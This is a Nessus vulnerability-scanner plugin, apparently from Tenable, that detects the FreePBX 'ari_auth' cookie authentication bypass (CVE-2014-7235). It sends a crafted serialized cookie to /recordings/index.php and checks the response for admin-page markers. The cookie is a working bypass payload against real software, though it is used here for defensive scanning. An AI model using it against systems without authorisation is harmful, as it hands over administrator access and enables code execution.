#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(81182);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2017/01/11 14:52:36 $");

  script_cve_id("CVE-2014-7235");
  script_bugtraq_id(70188);
  script_osvdb_id(112437);

  script_name(english:"FreePBX /recordings/index.php 'ari_auth' Cookie Authentication Bypass");
  script_summary(english:"Attempts to bypass authentication.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP application that is affected by an
authentication bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of FreePBX hosted on the remote web server is affected by
an authentication bypass vulnerability in the FreePBX ARI Framework
module / Asterisk Recording Interface (ARI). A remote, unauthenticated
attacker can exploit this issue to gain full administrator access to
the FreePBX server by using a crafted request via the 'ari_auth' HTTP
cookie. Consequently, the attacker can then execute arbitrary code on
the remote host.");
  # http://community.freepbx.org/t/critical-freepbx-rce-vulnerability-all-versions-cve-2014-7235/24536
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?4e142fdc");
  script_set_attribute(attribute:"see_also", value:"http://issues.freepbx.org/browse/FREEPBX-8070");
  script_set_attribute(attribute:"solution", value:"Refer to the referenced URL for vendor supplied instructions.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/09/30");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/09/30");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/02/05");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:freepbx:freepbx");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015-2017 Tenable Network Security, Inc.");

  script_dependencies("freepbx_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP", "installed_sw/FreePBX");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = 'FreePBX';
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port,qs:dir);

clear_cookiejar();

cookie = 'ari_auth=a%3A2%3A%7Bi%3A0%3Bs%3A88%3A%22xuyV19I%2F5g9VAzqkL3mCvvVuv7x8CegAVZt0EhCNdLXXZW9FAiEMbF3SHsK%2F0ULg28rMrRULamL%2FDXUdBjSc3Q%3D%3D%22%3Bi%3A1%3Bs%3A32%3A%229bbef5d712d6f9e052cdbf6eb32de6fe%22%3B%7D';

res = http_send_recv3(
  method       : "GET",
  item         : dir + "/recordings/index.php",
  port         : port,
  add_headers  : make_array('Cookie', cookie),
  exit_on_fail : TRUE
);

if (">Logout<" >< res[2] && ">Feature Codes<" >< res[2])
{
  output = strstr(res[2], "<div id='nav_menu'");
  if (empty_or_null(output)) output = res[2];

  security_report_v4(
    port        : port,
    severity    : SECURITY_HOLE,
    generic     : TRUE,
    request     : make_list(http_last_sent_request()),
    output      : chomp(output)
  );
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

